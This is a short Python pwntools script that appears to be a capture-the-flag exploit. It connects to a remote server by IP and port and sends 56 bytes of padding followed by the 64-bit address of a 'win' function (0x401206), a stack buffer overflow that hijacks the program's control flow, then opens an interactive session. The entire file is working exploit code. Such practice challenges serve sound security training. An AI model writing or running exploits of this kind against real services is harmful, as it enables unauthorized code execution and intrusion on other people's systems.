from pwn import *
import os

os.system('clear')
context.log_level = 'debug'
sh = remote('206.189.28.76',30687)
p = b'A' * 56
winAddr = 4198918 #0x401206
p += p64(winAddr)
sh.sendlineafter(b': ', p)
sh.interactive()
